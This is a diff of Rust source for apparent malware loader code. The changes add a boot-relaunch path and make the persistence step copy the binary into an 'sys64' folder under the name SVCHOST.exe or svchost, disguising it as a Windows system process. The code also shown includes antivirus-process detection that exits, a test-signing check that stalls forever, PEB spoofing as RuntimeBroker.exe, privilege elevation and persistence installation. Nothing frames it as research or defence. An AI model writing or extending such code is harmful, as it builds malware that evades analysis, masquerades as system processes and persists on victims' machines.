@@ -70,27 +70,31 @@ fn main() {
     let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
     log!("[3/10] LoaderConfig created, server={}", loader_cfg.server_url);
 
-    // 2. Anti-analysis
-    log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
-    if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_av_processes {
-        log!("[4/10] checking av processes...");
-        if check_av_processes() {
-            log!("[4/10] av process detected — exiting immediately");
-            std::process::exit(0);
+    // 2. Anti-analysis (skip on --boot relaunch)
+    if !is_boot {
+        log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
+        if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_av_processes {
+            log!("[4/10] checking av processes...");
+            if check_av_processes() {
+                log!("[4/10] av process detected — exiting immediately");
+                std::process::exit(0);
+            }
+            log!("[4/10] av process check passed");
         }
-        log!("[4/10] av process check passed");
-    }
-    if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_test_signing {
-        log!("[4/10] checking test signing...");
-        if check_test_signing() {
-            log!("[4/10] test signing detected — sleeping forever");
-            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
-            std::process::exit(0);
+        if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_test_signing {
+            log!("[4/10] checking test signing...");
+            if check_test_signing() {
+                log!("[4/10] test signing detected — sleeping forever");
+                std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
+                std::process::exit(0);
+            }
+            log!("[4/10] test signing check passed");
         }
-        log!("[4/10] test signing check passed");
-    }
-    if !loader_cfg.anti_analysis.enabled {
-        log!("[4/10] anti-analysis disabled, skipping");
+        if !loader_cfg.anti_analysis.enabled {
+            log!("[4/10] anti-analysis disabled, skipping");
+        }
+    } else {
+        log!("[4/10] --boot: skipping anti-analysis");
     }
 
     // 3. PEB spoofing
@@ -98,8 +102,8 @@ fn main() {
     elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
     log!("[5/10] spoof_peb done");
 
-    // 4. Elevation
-    if loader_cfg.require_admin {
+    // 4. Elevation (skip on --boot relaunch)
+    if !is_boot && loader_cfg.require_admin {
         log!("[6/10] require_admin=true, trying elevation...");
         if elevation::is_admin() {
             log!("[6/10] already admin, continuing");
@@ -129,20 +133,26 @@ fn main() {
                 }
             }
         }
-    } else {
+    } else if !is_boot {
         log!("[6/10] require_admin=false, skipping");
+    } else {
+        log!("[6/10] --boot: skipping elevation");
     }
 
-    // 5. Persistence
-    if let Some(path) = loader_cfg.copy_to_path.as_deref() {
-        if !path.is_empty() {
-            log!("[7/10] copy_to_path={}, relaunching...", path);
-            copy_and_relaunch(path);
+    // 5. Persistence (skip on --boot relaunch)
+    if !is_boot {
+        if let Some(path) = loader_cfg.copy_to_path.as_deref() {
+            if !path.is_empty() {
+                log!("[7/10] copy_to_path={}, relaunching...", path);
+                copy_and_relaunch(path);
+            }
         }
-    }
-    if loader_cfg.enable_persistence {
-        log!("[7/10] installing persistence...");
-        install_persistence();
+        if loader_cfg.enable_persistence {
+            log!("[7/10] installing persistence...");
+            install_persistence();
+        }
+    } else {
+        log!("[7/10] --boot: skipping persistence");
     }
     log!("[7/10] persistence done");
 
@@ -273,7 +283,7 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
 
 // ── Persistence (lightweight, no libra-modules dependency) ────────────
 
-fn copy_and_relaunch(relative_path: &str) {
+fn copy_and_relaunch(_relative_path: &str) {
     let current_exe = match env::current_exe() {
         Ok(e) => e,
         Err(_) => return,
@@ -283,23 +293,29 @@ fn copy_and_relaunch(relative_path: &str) {
     #[cfg(target_os = "windows")]
     let target_dir = {
         let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
-        std::path::PathBuf::from(appdata).join(relative_path)
+        std::path::PathBuf::from(appdata).join("sys64")
     };
     #[cfg(not(target_os = "windows"))]
     let target_dir = {
         let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-        std::path::PathBuf::from(home).join(".local/share").join(relative_path)
+        std::path::PathBuf::from(home).join(".local/share").join("sys64")
     };
 
     if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
         return;
     }
 
-    let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());
+    #[cfg(target_os = "windows")]
+    let target_exe = target_dir.join("SVCHOST.exe");
+    #[cfg(not(target_os = "windows"))]
+    let target_exe = target_dir.join("svchost");
+
     if std::fs::create_dir_all(&target_dir).is_err() {
+        log!("copy_and_relaunch: create_dir_all failed for {:?}", target_dir);
         std::process::exit(0);
     }
     if std::fs::copy(&current_exe, &target_exe).is_err() {
+        log!("copy_and_relaunch: copy failed from {:?} to {:?}", current_exe, target_exe);
         std::process::exit(0);
     }
 
